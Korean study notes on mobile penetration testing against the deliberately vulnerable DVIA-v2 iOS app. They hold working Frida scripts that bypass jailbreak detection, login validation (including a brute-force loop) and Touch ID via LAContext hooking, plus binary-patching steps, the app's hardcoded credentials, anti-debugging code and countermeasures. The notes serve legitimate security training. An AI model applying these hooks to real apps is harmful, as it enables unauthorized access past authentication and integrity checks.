		DVIA-v2 바이너리 실행 시 부여되는 realbase_address에서 분기점의 오프셋을 더하면 분기점의 실제 메모리주소가 나온다.
			* realbase_address + 분기점 offset = jailbreak_address
		레지스터 x0의 값으로 0x1이 입력되어 탈옥된 기기라는  "Device is Jailbroken"메시지가 출력되는 것을 확인할 수 있다.
			* 레지스터 x0은 위에서 본 레지스터 w0
		분기점 우클릭  →  Path Intrcution 클릭 ->레지스터 w0의 값을 0x1으로 수정한 뒤에 엔터 -> File 클릭 → Export Program 클릭->Format을 Binary로 변경 → OK 버튼
	
	예시3
		바이너리 파일의 문구를 변조하기 위해 아래의 사이트에서 HxD를 다운로드
		간단히 출력 문장 수정
	
	예시4
		ASLR이 적용되어 있지 않은 앱은 어플리케이션 패칭이 어려우므로 적용유무를 꼭 확인
		클래스에서 사용하는 함수들 중에 Kill Application과 관련된 것이 있는지 검색
		__T07DVIA_v240ApplicationPatchingDetailsViewControllerC04killC6TappedyypF"함수가 강제종료 로직으로 의심이 되는 부분이 발견
		__stubs::_exit"을 더블클릭
		stubs::_exit" 로직이 실행되지 않도록 변조를 시도
		"__stubs::_exit"가 있는 행을 우클릭 → Patch Instruction 클릭
		(nop으로 변경한 뒤 엔터를 누른다.)이렇게 변조된 바이너리를 추출하여 실행하면 기존과 동일하게 앱이 강제종료된다
		아래의 박스 친 부분을 모두 nop으로 변경한다.
		※ 1001ac718 ret까지 nop으로 변경하면 안된다. -> exit 시 return 만 하게
		File 클릭 → Export Program 클릭
		
	대응방안
		애플리케이션 바이너리 파일의 해시 값을 검증(코드 무결성 검증)하여 앱이 위·변조되었는지 체크
		원본 해쉬값 서버 보관 -> 앱 다운로드 후 apk해쉬값 서버로 전송 -> 비교 -> 변조여부 전송
	
ASLR(Address Space Layout Randomization)
	주소 공간 배열 무작위화"로 직역되며 메모리 손상 취약점 공격을 방지하기 위한 기술이다.
	- 프로그램이 실행될 때마다 메모리주소가 랜덤으로 변경
	otool 
		개체 파일이나 라이브러리의 지정된 부분을 표시할 수 있는 프로그램이다. Fairplay DRM 및 ALSR 적용유무를 확인하는데 사용
	* 명령어 : cd [바이너리 파일 경로]
	* 명령어 : otool -Vh [바이너리 파일 이름]
		PIE'라는 문구가 출력되면 바이너리 파일에 ASLR이 적용
		
		
프리다(Frida) 문법 및 후킹에 사용되는 함수 
	ObjC.available 
		- 현재 프로세스에 Objective-C 런타임이 로드되었는지 여부를 지정하는 Boolean(True, False)
		- 해당 앱에서 FIRDA가 실행가능한 환경인지 체크
	ObjC.classes 
		현재 등록된 클래스에 대한 ObjC.object 자바스크립트 바인딩에 대한 오브젝트 맵핑 클래스 이름
		프로세스에 로드된 클래스들의 이름을 보여줌
	Interceptor.attach(target, callbacks[, data]) 
		target에서 함수에 대한 호출을 가로챔 (호출을 가로채고자 하는 함수의 주소를 지정하는 NativePointer)
		callbacks 인수는 하나 이상을 포함하는 오브젝트(객체)
		onEnter: function(args) 
			NativePointer 객체의 배열로 인수를 읽거나 쓰는 데 사용할 수 있는 하나의 인수 args가 제공된 callback 함수(args[0 = self], [1 = select], [2 = 후킹 함수의 매개변수]
		onLeave: function(retval) - retunr 값 변조 시 사용
			원래 return 값을 포함하는 NativePointer에서 파생 객체인 인수 retval이 제공된 callback 함수
			retval.replace(1337)를 호출하여 return 값을 정수 1337로 바꾸거나,
 			retval.replace(ptr(0x1234))를 포인터로 변경 가능
	Module.findBaseAddress(name), Module.getBaseAddress(name)
		name 모듈의 base 주소를 반환
		모듈을 찾을 수 없는 경우, find-prefixed 함수는 null을 반환하고 get-prefixed 함수는 예외를 발생함
	NativePointer (new NativePointer(s)) 
		메모리 주소를 "10진수" 또는 "접두사가 0x인 16진수"로 포함하는 문자열 s에서 새로운 NativePointer를 생성
		간결하게 ptr(s)로 사용 가능
	
	객체 속성
		6. $methods
			- 주어진 객체의 클래스와 부모 클래스에 의해 노출된 기본 메소드 이름을 포함하는 배열
		7. $ownMethods
			- 부모 클래스를 포함하지 않고, 주어진 객체의 클래스에 의해 노출된 기본 메소드 이름을 포함하는 배열
		8. context
			- ia32/x64/arm에 대해 각각 EIP/RIP/PC 및 ESP/RSP/SP를 지정하는 NativePointer 객체인 pc 및 sp 키가 있는 객체
			- 다른 프로세스별 키(예, eax, rax, r0, x0 등)도 사용 가능
			- 이 키에 할당하여 레지스터 값을 업데이트 가능
	
	안드로이드 후킹 관련
		java.perform()(Java.performNow() 클래스에 대한 액세스가 필요하지 않은 경우 사용)
			현재 스레드가 VM에 연결되어 있는지 확인하고 function을 호출
			Java.perform(() => {
				const Activity = Java.use('android.app.Activity');
				Activity.onResume.implementation = function () {
					send('onResume() got called! Let\'s call the original implementation');
					this.onResume();
				};
			});
		
		Java.performNow()
			현재 스레드가 VM에 연결되어 있는지 확인하고 function을 호출
			frida로 spawn시킬때는 Java.perform()보다 Java.performNow()를 사용
		
		Java.setImmediate()
			Frida는 단말기가 느려질 때 자동으로 프로세스를 종료하는 특성이 있다. setImmediate()를 사용하면 백그라운드로 자동으로 스크립트가 재실행되어 종료되지 않는다.
			setImmediate(function() {
				Java.perform(function() {
		
		Java.choose
			힙을 스캔하여 클래스에서 실행 중인 인스턴스화 된 객체를 찾을 수 있다.
			- onMatch : 일치하는 인스턴스를 찾을 경우 호출한다.
			- onComplete : 일치하는 것을 모두 찾고난 후에 호출한다.
			  Java.choose(com.mypackage.name.class, {
				"onMatch" : function(instance) {
					...},
				"onComplete" : function() {}
		
		Java.enumerateLoadedClasses(callbacks)
			로드된 모든 클래스를 열거하고 모든 일치 항목을 출력한다.
			- onMatch : 일치하는 인스턴스를 찾을 경우 호출한다.
			- onComplete : 일치하는 것을 모두 찾고난 후에 호출한다.
			Java.perform(function() {
			  Java.enumerateLoadedClasses(
			  {
				"onMatch" : function(className) {
				  console.log(className)
				},
				"onComplete":function() {}
			  })
			}
		
		Java.use(ClassName)
			변수와 메소드에 접근할 수 있는 클래스 객체를 반환한다.
			- implementation : 클래스에 정의된 메소드를 재작성
		
		overload
			후킹하려는 메서드가 다양한 인자에 대해 정의되어 있다면, overload를 통하여 후킹하려는 메서드를 명시
			myClass.takudaddy_method.overload("[B", "[B").implementation = function(param1, param2)
			myClass.takudaddy_method.overload("android.context.Context", "boolean").implementation 
			System.exit.overload('int').implementation = function(args)
		
		
탈옥 탐지 우회
	이론 및 대응방법
		1. 파일기반 체크(File-based Checks) - 파일 또는 디렉터리 존재여부로 탈옥 여부를 판단하는 방법.
			/private/var/stash	/usr/sbin/sshd
			/private/var/lib/apt	/usr/libexec/ssh-keysign
			/private/var/tmp/cydia.log	/usr/sbin/sshd
			/private/var/lib/cydia	/usr/bin/sshd
			/private/var/mobile/Library/SBSettings/Themes	/usr/libexec/sftp-server
			/Library/MobileSubstrate/MobileSubstrate.dylib	/etc/ssh/sshd_config
			/Library/MobileSubstrate/DynamicLibraries/Veency.plist	/etc/apt
			/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist	/Applications/Cydia.app
			/System/Library/LaunchDaemons/com.ikey.bbot.plist	/Applications/RockApp.app
			/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist	/Applications/Icy.app
			/var/cache/apt	/Applications/WinterBoard.app
			/var/lib/apt	/Applications/SBSettings.app
			/var/lib/cydia	/Applications/MxTube.app
			/var/log/syslog	/Applications/IntelliScreen.app
			/var/tmp/cydia.log	/Applications/FakeCarrier.app
			/bin/bash	/Applications/blackra1n.app
			/bin/sh	 
		
		파일 권한 기반 체크(Checking File Peremissions)
			Application 샌드박스 외부의 위치에 파일 생성을 시도하는 것으로 탈옥 여부를 판단
			탈옥된 기기가 아니라면 Application이 샌드박스 외부에 파일을 생성하는 것은 불가능
			/private 디렉터리에 파일을 생성하도록 하여 성공적으로 생성된다면 디바이스가 탈옥감지
				NSString *stringToBeWritten = @"This is a test.";
				[stringToBeWritten writeToFile:@"/private/jailbreak.txt" atomically:YES encoding:NSUTF8StringEncoding error:&error];
				if(error==nil)
				{return YES;} 
				else 
				{[[NSFileManager defaultManager] removeItemAtPath:@"/private/jailbreak.txt" error:nil];}
		
		프로토콜 핸들러 기반 체크(Checking Protocol Handlers)
			프로토콜 핸들러 사용여부를 기반으로 탈옥 여부를 판단
			프로토콜 핸들러란 특별한 URL을 처리하는 프로그램으로 "cydia://설치할 패키지 이름"과 같이 사용
			옥된 기기에 거의 모두 설치되어 있는 cydia 앱을 이용한 프로토콜 핸들러가 가능할 경우 탈옥된 기기
				if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]])
				{
					return YES;
				}
		
		시스템 API 호출 기반 체크(Calling System APIs)
			시스템 API를 호출하는 것으로 탈옥 여부를 판단하는 방법
			탈옥된 기기에서만 system() 함수를 통해 /bin/sh에 접근할 수 있음.
			NULL을 인수로 system() 함수를 호출하면 0이 반환되고, 탈옥된 기기에서는 1이 반환됨
		
		OpenSSH 서비스 기반 체크(OpenSSH Service Detection)
			OpenSSH 서비스가 동작중인지를 확인하는 것으로 탈옥 여부를 판단
			SSH 연결 시간이 초과될때까지 기다려야하므로 이 탐지 기법은 매우 느릴 수 있음.
			openSSH 서비스용 포트를 변경하여 해당 탐지기법을 쉽게 우회
	
	실습
		1.
		3uTools Files에서 Applications(User) 클릭 또는 탐색창에 /var/Containers/Bundle/Application 입력
		ASLR 적용여부 확인 
			otool -Vh [바이너리 파일 이름]
		바이너리 파일 분석
			Jailbreak Test1 클릭 시 발생했던 오류문구를 Filter에 입력
			음영표시된 칸의 우측 "XREF[1]:     __T07DVIA_v213DVIAUtilitiesC9sho..."을 더블클릭
			내용을 분석해 보면 레지스터 w0의 값이 0x0일 때와 아닐 때의 결과가 달라진다는 것을 알 수 있다.
			* 1001cc17c : 문구를 보았을 때 탈옥되지 않은 기기일 때 실행되는 로직인걸 알 수 있음.
			* 1001cbdd4 : 문구를 보았을때 탈옥된 기기를 사용할 때 실행되는 로직인걸 알 수 있음.
			* tbz(Test bit and Branch if Zero) : 테스트 비트의 값을 0과 비교하여 결과에 따라 다른 오프셋의 레이블로 분기함.
			Jailbreak Test1' 클릭 시 레지스터 w0에 입력되는 값을 0x0으로 변조하여 탈옥이 탐지되지 않았을 때의 로직이 실행되어 탈옥탐지 기능을 우회
			분기점의 오프셋 : 1001cbdd0
		바이너리 파일 변조
			값 확인 
				var realbase_address = Module.findBaseAddress('DVIA-v2') //DVIA-v2 바이너리가 실행되어 메모리에 올라갔을때 할당된 주소를 realbase_address에 저장
				console.log('realbase address : ' + realbase_address) //realbase_address에 저장된 주소를 화면에 출력

				var jailbreak_address = realbase_address.add('0x1cbdd0') //realbase_address에 분기점 오프셋을 더하면 실제 분기점 메모리 주소가 jailbreak_address에 저장됨
				console.log('jailbreak address : ' + jailbreak_address) //jailbreak_address에 저장된 주소를 화면에 출력

				Interceptor.attach(jailbreak_address, { //jailbreak_address에서 호출되는 값을 가로채기 위해 준비
					onEnter: function(args){ //호출되는 레지스터 값을 받아옴
						console.log(JSON.stringify(this.context)) //받아온 레지스터 값을 JSON 형태로 화면에 출력
					}
				})
				레지스터 x0가 위에서 본 레지스터 w0
			
			값 변조
			var realbase_address = Module.findBaseAddress('DVIA-v2')
				console.log('realbase address : ' + realbase_address)

				var jailbreak_address = realbase_address.add('0x1cbdd0')
				console.log('jailbreak address : ' + jailbreak_address)

				Interceptor.attach(jailbreak_address, {
					onEnter: function(args){
						console.log('as is : ' + JSON.stringify(this.context))
						this.context.x0=0x0 //x0의 값을 0x0으로 변조
						console.log('to be : ' + JSON.stringify(this.context)) //변조된 결과 출력
					}
		
		2.
		탈옥 탐지 메소드 탐색
			if(ObjC.available){ //대상이 연결이 되어져 코드실행이 가능한 환경인지 확인
				for(var classname in ObjC.classes) //메모리에 올라가있는 클래스를 가져온다
					console.log(classname) //가져온 클래스의 이름을 출력한다
			}
			frida -U -l hagsig_jailbreak1.js DVIA-v2
			* DVIA-v2.JailbreakDetectionViewController는 화면 출력과 관련된 View Controller 부분이므로 무시한다.
			frida -U -l hagsig_jailbreak1.js DVIA-v2 | find /i "jail"
			위에서 찾아낸 JailbreakDetection 클래스가 어떤 메소드를 사용하는 알기위해 아래의 코드를 작성한 뒤 실행
				if(ObjC.available){
					var classname = "JailbreakDetection" //분석하고자 하는 클래스 이름을 지정한다
					var methods = ObjC.classes[classname].$ownMethods //클래스가 가지고 있는 기본 메소드를 배열 형식으로 가져온다
					console.log(methods) //가져온 메소드정보를 출력한다
				}
			* + 는 클래스에 대한 메소드를, - 는 인스턴스에 대한 메소드를 뜻함.
				// Car sonata = new Car();  Car라는 자료형을 가진 sonata라는 이름의 인스턴스를 생성해주는 방법
		
		탈옥 탐지 메소드 반환값 변조
			if(ObjC.available){
				var classname = "JailbreakDetection"
				var methodname = "isJailbroken" //메소드 이름을 변수에 저장한다
				var hook = ObjC.classes[classname][methodname]//클래스명과, 메소드명을 배열형식으로 넣어준다.
				Interceptor.attach(hook.implementation,{ // implementation : 해당 메소드를 실행
				onLeave:function(retval){
					console.log("[*] Class Name : " + classname) //클래스명 출력
					console.log("[*] Method Name : " + methodname) //메소드명 출력
					console.log("[*] Type of return value : " + hook.returnType) //반환대는 값의 형식을 출력한다.
					console.log("[*] Return Value : " + retval) //반환값을 출력한다.
				}
				})
			}
			변수 bool 이며, 0x1(True)가 반환
			반환값 0x1을 0x0으로 변조,  변조하고자 하는 값을 포인터 형식(ptr)으로 생성해야 한다. 그래야지만 메모리에 올라가서 값을 불러와줄 수 있다.
			if(ObjC.available){
				...
				
				Interceptor.attach(hook.implementation,{
				onLeave:function(retval){
					var new_val=ptr("0x0");
					retval.replace(new_val);
					console.log("[*] New Return Value : " + retval) 
				}
				})
			}
		
		3.
		"Device is Jailbroken, the application will now exit" 메시지가 출력되면서 앱이 강제 종료
		음영표시된 칸의 우측 "XREF[1]:     __T07DVIA_v232JailbreakDetection..."을 더블클릭
		레지스터 w8의 값이 0x0일 때와 아닐 때의 결과
		#0x0을 'Jailbreak Test 3' 클릭 시 w8의 반환값으로 수정하여 탈옥탐지 기능을 우회
		분기문을 변조하여 우회
			var realbase_address = Module.findBaseAddress('DVIA-v2')
			var jailbreak_address = realbase_address.add('0x1959dc')
			Interceptor.attach(jailbreak_address,{
				onEnter:function(args){
					console.log(JSON.stringify(this.context))//w8 확인
				}
			})
			레지스터 x8의 값으로 0x1이 입력되어 탈옥된 기기라는 "Device is Jailbroken, the application will now exit" 메시지가 출력
			분기점 우클릭  →  Path Intrcution 클릭
			레지스터 w8의 값을 0x1으로 수정한 뒤에 엔터를 누른다.
				* 기존(AS-IS) : 0x0
				* 변경(TO-BE) : 0x1]
			File 클릭 → Export Program 클릭
			Format을 Binary로 변경 → OK 버튼 클릭
		


	
디버깅 방지 방법(Anti debugging)
	ptrace함수를 이용하여 디버거 연결 방지
		ptrace는 프로세스 디버깅에 사용되는 함수로, 프로세스 실행을 관찰 및 제어하고 메모리와 레지스터를 검사하고 변경할 수 있는 수단을 제공
		ptrace 함수의 PT_DENY_ATTACH 옵션을 사용하여 디버거가 앱에 연결되는 것을 방지
		공식 iOS API가 아니므로 App Store 등록 심사에서 거부당할 수 있으므로, 코드에서 직접 호출하지 않고 dlsym을 통해 ptrace 함수 포인터를 가져와 호출하는 방식으로 사용.
			#import <dlfcn.h>
			#import <sys/types.h>
			#import <stdio.h>
			typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);
			void anti_debug() {
			ptrace_ptr_t ptrace_ptr = (ptrace_ptr_t)dlsym(RTLD_SELF, "ptrace");
			ptrace_ptr(31, 0, 0, 0); // PTRACE_DENY_ATTACH = 31
			}
		디버거가 연결될 경우 "Process OOO exited with status = 45 (0x0000002d)"와 같은 오류 메시지가 출력
	
	sysctl 함수를 이용한 연결된 디버거 탐지
		sysctl은 시스템 정보를 가져오거나 설정할 수 있게 해주는 함수임.
		sysctl함수를 이용하여 디버거 프로세스가 올라오면 이를 탐지하고 앱을 종료
		P_TRACED 플래그가 활성화되면 디버깅
		static bool AmIBeingDebugged(void){
			int junk;
			int mib[4];
			struct kinfo_proc info;
			size_t size;

			info.kp_proc.p_flag = 0;

			mib[0] = CTL_KERN;
			mib[1] = KERN_PROC;
			mib[2] = KERN_PROC_PID;
			mib[3] = getpid();

			size = sizeof(info);
			junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
			assert( junk == 0);

			return ( (info.kp_proc.p_flag & P_TRACED) != 0 ); 
		}
	
	프리다 아티팩트(Artefacts)를 통한 디버거 탐지
		프리다가 설치 또는 동작하면서 생성한 파일, 서비스 포트 등을 검사하여 디버거를 탐지
		프리다 서버 프로세스는 기본적으로 TCP 27047 포트를 사용하므로 해당 포트가 열려 있는지 확인
		프리다 관련 로드된 라이브러리 목록 탐지 (frida-gadget*.so / frida-agent*.so 등)
		디버깅에 사용되는 파일 검사 (frida-server 등)
		D-Bus 프로토콜을 사용하여 통신하므로 열린 모든 포트에 D-Bus AUTH 메시지를 전송하여 응답 확인
		

런타임 조작(로그인/인증 우회)
	런타임 조작이란 디버깅 툴을 이용해 앱이 실행 중인 상태에서 흐름을 조작하여 보안 기능을 우회하는 것
	인스턴스 변수를 수정하여 로그인(인증) 검사, 탈옥 탐지 기능 등을 우회
	인증 값이 맞을 때까지 무차별 대입 공격(brute-force attack)을 수행하는 것도 가능
	대응 -디버깅 툴을 이용한 런타임 조작이 불가능하도록 디버깅 방지 기능을 적용
	
	입력한 계정정보가 올바르지 않다며 "Incorrect Username or Password" 메시지가 출력됨
	앱이 사용하는 클래스를 확인
		if(ObjC.available){//대상이 연결이 되어져 코드실행이 가능한 환경인지 확인
			for(var classname in ObjC.classes){
				console.log(classname)
			}
		}
	frida -U -l hagsig_runtime.js DVIA-v2 | find /i "login"
	* Objective-C로 이루어진 코드는 프리다(Frida)를 통해서 메소드가 검색이 되지만, 스위프트(Swift)로 이루어진 코드는 메소드 검색이 안된다.
	* 스위프트(Swift)로 이루어진 코드는 기드라(Ghidra)를 통해 분석
	
	메소드 확인
		if(ObjC.available){
			var classname="LoginValidate"
			var methods=ObjC.classes[classname].$ownMethods
			for(var i=0;i<methods.length;i++){
				console.log(methods[i])
			}
		}
	+ 는 클래스에 대한 메소드를, - 는 인스턴스에 대한 메소드
	
	로그인 메소드 반환값 변조
		if(ObjC.available){
			var classname="LoginValidate"
			var methodname="isLoginValidated"
			var hook = ObjC.classes[classname][methodname]
			Interceptor.attach(hook.implementation,{
				onLeave:function(retval){
					console.log("[*] Class Name : " + classname)
					console.log("[*] Method Name : " + methodname)
					console.log("[*] Type of return value : " + hook.returnType)
					console.log("[*] Return Value : " + retval)
					var new_val=ptr("0x1")
					retval.replace(new_val)
				}
			})
		}
	2.
	- 관리자 아이디로 추정되는 "admin13412"과 패스워드로 추측되는 "S@g@rm@7h@8848"이 평문으로 노출되어 있다.
	※ 소스코드내에 계정정보를 평문으로 하드코딩해 놓으면 이런 식으로 노출된다.
	* 평문 노출된 아이디 : admin13412
	* 평문 노출된 패스워드 : S@g@rm@7h@8848
	
	3.
	레지스터 x8과 x9의 값을 비교하여 같을 때와 아닐 때의 결과가 달라진다는 것을 알 수 있다.
	* 10015e4f4 : 문구를 보았을 때 인증이 실패하였을 때 실행되는 로직인걸 알 수 있음.(incorrect)
	* 10015e3e8 : 문구를 보았을때 인증이 성공하였을 때 실행되는 로직인걸 알 수 있음.(success)
	
	mov x8, #0x2290
	ldur x9,[x29, #local_28]
	cmp x9, x8
	b.ne LAB_10015e4f4 //(incorrect)
		① 레지스터 x8에 16진수 0x2290(10진수:8848)이 저장된다.(시스템이 원하는 인증코드)
		* mov(Move) : 데이터 복사를 담당하는 명령어로 오른쪽에 있는 값을 왼쪽의 레지스터에 저장한다.
		② 레지스터 x9에 사용자가 입력한 값(인증코드)을 불러온다.
		* ldur(Load Memory to Register) : 메모리에 있는 값을 레지스터로 불러들인다.  
		③ 레지스터 x8과 x9의 값이 같은지 비교하여 다르면 1, 같으면 0으로 상태플래그를 세팅한다.
		* cmp(Compare) : 레지스터 값을 비교하여 값이 다를 경우 1(참), 같을 경우 0(거짓)으로 eflags(상태플래그)를 업데이트 한다.
		④ 상태프래그 값이 1일 경우 LAB_10015e4f4로, 0일 경우 LAB_10015e3e8로 점프한다.
		* b.ne(Branch if Not Equal) : eflags의 값이 1(참)인지 0(거짓)인지에 따라 다른 오프셋의 레이블로 분기한다.
	
	인증 성공값으로 변조하는 우회 기법, 인증 성공 값이 있ㅈ는 패킷값이 있는것이 아닌이상 무조건 패치나 브루트 포스 공격
		* 분기점의 오프셋 : 10015e3e0
		var realbase_address = Module.findBaseAddress('DVIA-v2') //DVIA-v2 바이너리가 실행되어 메모리에 올라갔을때 할당된 주소를 realbase_address에 저장
			console.log('realbase address : ' + realbase_address) //realbase_address에 저장된 주소를 화면에 출력
			var runtime_address = realbase_address.add('0x15e3e0') //realbase_address에 분기점 오프셋을 더하면 실제 분기점 메모리 주소가 runtime_address에 저장됨
			console.log('runtime address : ' + runtime_address) //runtime_address에 저장된 주소를 화면에 출력
			Interceptor.attach(runtime_address, { //runtime_address에서 호출되는 값을 가로채기 위해 준비
				onEnter: function(args){ //호출되는 레지스터 값을 받아옴
					console.log(JSON.stringify(this.context)) //받아온 레지스터 값을 JSON 형태로 화면에 출력
				}
			})
		레지스터 x8의 값으로 0x2290, 레지스터 x9의 값으로 우리가 입력한 값이 0x4d2으로 16진수 형식으로 출력
		var runtime_address = realbase_address.add('0x15e3e0')
		
		function PaddingToZero(number){ //숫자 앞을 0으로 채워넣는 함수 생성
			if(number <= 9999){
				number = ("000" + number).slice(-4) //숫자 앞을 000으로 채운뒤, 뒤에서부터 4자리를 변수에 저장
				return String(number) //변수에 저장된 숫자를 문자열로 변환하여 반환
			}
		}
		그냥 000채우고 String 으로 바꾸면 16진수 0x1111 이런 형식으로 인증되서 자장되네
		Interceptor.attach(runtime_address,{
			onEnter:function(args){
				console.log('Answer Code x8 : ' + this.context.x8) //시스템이 원하는 인증값을 출력
				console.log('Insert Code x9 : ' + this.context.x9) //사용자가 입력한 인증값을 출력
				var answer_code = parseInt(this.context.x8,16) //시스템이 원하는 인증값을 16진수에서 10진수로 변환하여 변수에 저장
				answer_code=String(answer_code)
				
				for(var i=0; i<9999;i++){
					var pad_code=PaddingToZero(i);
					console.log(pad_code)
					if(answer_code==pad_code){
						this.context.x9=pad_code
						break
					}
				}
				console.log('Answer Code x8(Hex) : ' + this.context.x8) //시스템이 원하는 인증값을 16진수로 출력
				console.log('Answer Code x8(Dec) : ' + answer_code) //시스템이 원하는 인증값을 10진수로 출력
				console.log('Brute Force Code x9(Hex) : ' + this.context.x9) //무차별 대입공격을 통해 알아낸 인증값을 16진수로 출력
				console.log('Brute Force Code x9(Dec) : ' + parseInt(this.context.x9, 16)) //무차별 대입공격을 통해 알아낸 인증값을 10진수로 출력
			}
		})

IPC 취약점(URL Schemes)
	- IPC(Inter Process Communication)는 프로세스들 사이에 서로 데이터를 주고받는 행위 또는 방법이나 경로를 말한다.
	- 앱이 신뢰할 수 없는 출처의 URL 스키마(Schemes)를 제대로 검증하지 않고 실행할 경우 문제가 발생할 수 있다.
	- 즉, URL 스키마에 대한 검증 없이 실행하여 문제가 발생하는 것을 IPC 취약점이라고 부른다.
	* 스키마(Schemes) : 외부에서 자신의 앱에 접근할 수 있도록 해주는 하나의 통로.
		- URL 스키마 또는 스킴이라 부르며, URL을 통해 정의한 프로토콜로 다른 앱과 통신할 수 있도록 해주는 통로를 말한다.
		- iOS는 샌드박스 정책에 의해 다른 앱들과 정보를 주고받기 힘드므로, URL 스키마를 이용하여 정보를 주고받는다.
		- 일반적인 URL 스키마는 다음과 같은 형태를 가지며, 웹 브라우저 앱을 통해 URL 스키마를 실행할 수 있다.
		※ 동일한 스키마를 사용하는 앱이 존재한다면 어떤 앱을 실행할 지 묻는다.
		scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]
			ex_ 입력 창에서  : tel://01012345678 할시 통화 스키마 연결
	
	3-1. Built-in URL Schemes
 		애플(Apple)에서 기본적으로 제공하는 스키마를 빌트인 URL 스키마라 부르며, 시스템 앱과 통신할 수 있는 기능을 제
			mailto	메일 앱을 시작하고 이메일 작성 시트를 여는 데 사용	mailto:frank@wwdcdemo.example.com
			tel	전화 앱을 실행하고 지정된 전화 번호로 전화 걸기를 시작하는데 사용	tel:1-408-555-5555
			facetime	지정된 사용자에게 FaceTime 통화를 시작하는 데 사용	facetime://user@example.com
			sms	메시지 앱을 시작하는데 사용	sms:1-408-555-1212
			map	지리적 위치를 표시하고 두 지점 사이의 운전 방향을 생성하는 데 사용	http://maps.apple.com/?q=Mexican+Restaurant
			itunes	 iTunes Music Store의 콘텐츠에 연결하는 데 사용	http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewAlbum?i=156093464&id=156093462&s=143441
			youtube	 YouTube 웹사이트에 연결하여 지정된 동영상을 재생하는데 사용	http://www.youtube.com/watch?v=VIDEO_IDENTIFIER
		
	Custom URL Schemes
		사용자가 직접 커스텀마이징(customize)하여 사용하는 스키마를 커스텀 URL 스키마
		사용자 앱에서 URL 스키마를 구현해 처리하며, Info.plist 파일에 CFBundleUrlSchemes 키(key)를 활용하여 구성
		e
		
	AppDelegate.swift	
		AppDelegate.swift 파일에서 수신받은 URL 스키마를 처리
		소스코드를 받은 경우에는 AppDelegate.swift 파일에서 URL 스키마 처리 부분을 확인하면 되며, 
		소스코드를 받지 못한 경우에는 앱의 바이너리 파일을 기드라(Ghidra)와 같은 엔지니어링 도구를 이용해 분석해야 한다.
		※ AppDelegate.swift 파일은 ios13을 기준으로 많은 점이 변경
			IOS13부터는 AppDelegate.swift, SceneDelegate.swift 두 파일로 나뉘어 생긴다.
			앱의 중요 데이터 구조를 초기화
			앱의 scene의 환경설정
			앱 밖에서 발생한 알림(배터리 부족 경고, 다운로드 완료 알림 등)에 대응
			특정한 scenes, views, view controllers에 한정하지 않고 앱 자체를 타겟하는 이벤트에 대응
			애플 푸쉬 알림과 같이 실행시 요구되는 모든 서비스를 등록
	
	대응방법
		- Custom URL Schemes를 사용할 때 사용자가 한번 더 확인할 수 있는 로직을 추가한다.
		- 중요한 기능/뷰에 대한 접근을 사용한다면 사용자 인증 정보를 확인하는 로직을 추가한다.
		
		
	실습
		 /var/containers/Bundle/Application/$uuid/DVIA-v2.app/Info.plist
		 CFBundleURLSchemes' 키(KEY)
		 <key>CFBundleUrlSchemes<key>
		 <array>
			<string>dvia</string>
			<string><dviaswift</scring>
		 </array>
		 * 사용 중인 스키마 : dvia, dviaswift
			diva:// 형식으로 사용시 해당 앱이 실행 되며 동작
		바이너리 파일 분석
			Symbol Tree 창의 택스트 입력란에 "appdelegate"를 검색
			T07DVIA_v211AppDelegateC11applicationSbSo13UIApplicationC_10Foundation3URLV4opens10DictionaryVySC0F17OpenURLOptionsKeyVypG7optionstF" 함수(Functions)를 클릭
			실무에서는 어떤 함수가 URL 스키마를 처리하는지 하나씩 눌러가며 찾아야 한다
			커스텀 URL 스키마 호출 형태 : /phone/call_number/ 확인가능
			위에서 확인한 커스텀 URL 스키마 호출 형식에 맞추어 웹 브라우저 앱의 URL 입력란에 기입
				dvia://phone/call_number//01012345678
				커스텀 URL 스키마를 통해 정상적으로 앱 호출 및 처리
				
		
로컬 인증 우회 취약점
	로컬인증(Local Authentication)은 디바이스 내부에 저장된 *자격증명을 기준으로 사용자를 인증하는 것을 말한다.
		* 자격증명: 암호, 지문(Touch ID), 얼굴(Face ID) 등
	로컬 인증을 앱에서 사용하기 위해 로컬 인증 프레임워크를 사용
		프레임워크는 Secure Enclave에게 인증하려는 이유를 알려주는 메시지을 제공해 주고, 인증 성공 또는 실패를 나타내는 bool 결과를 받게 된다.
	로컬 인증 프레임워크 취약점
		로컬 인증 프레임워크를 사용하면 애플에서 제공하는 LAContext 클래스의 evaluatePolicy 인스턴스 메소드를 사용
		evaluatePolicy 인스턴스 메소드는 성공 또는 실패를 나타내는 Boolean만 반환하기 때문에 쉽게 우회
	swift, objcect-c 두개종류 코드있나?
	if(ObjC.available) {
		var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
		Interceptor.attach(hook.implementation, {
			onEnter: function(args) {
				send("Hooking Touch Id..")
				var block = new ObjC.Block(args[4]);
				const appCallback = block.implementation;
				block.implementation = function (error, value)  {
					const result = appCallback(1, null);
					return result;
				};
			},
		});
	} else {
		console.log("Objective-C Runtime is not available!");
	}

네트워크 패킷 캡처 방법
	2.1. PC 설정
		- PC의 모바일 핫스팟(테더링) 기능을 활성화한다.
		방법1). 설정 → 네트워크 및 인터넷 → 모바일 핫스팟 → 활성화
		방법2). 우측 하단 말풍선 아이콘 클릭 → 와이파이 아이콘을 클릭하여 활성
	디바이스(스마트폰) 설정
		설정 앱 실행 → 연결 → Wi-Fi 클릭 → PC의 모바일 핫스팟 네트워크 선택
	와이어샤크를 실행한뒤 위에서 확인한 네트워크 어댑터를 더블클릭하여 패킷 캡처를 실행

Web View 종류 및 취약점
	웹뷰는 애플리케이션 내에서 웹 콘텐츠를 표시하는 GUI 구성 요소로, 앱에 내장된 웹 브라우저
	최근에는 네이티브 방식으로 개발하지 않고, 웹뷰를 이용한 하이브리드 방식으로 앱을 많이 개발
	
	네이티브 앱(Native App)
		모바일 기기에 최적화된 *네이티브 언어로 개발된 앱을 말한다.
		*네이티브 언어 : [안드로이드 : 코틀린(Kotlin), 자바(Java)], [iOS : 스위프트(Swift), 오브젝티브 C(Objective C)]
		예시) 카카오톡, 유튜브, 페이스북, 인스타그램 등
		- 네트워크 패킷 분석 툴(WireShark)을 이용하여 평문으로 전송되는 중요정보가 있는지 확인한다.
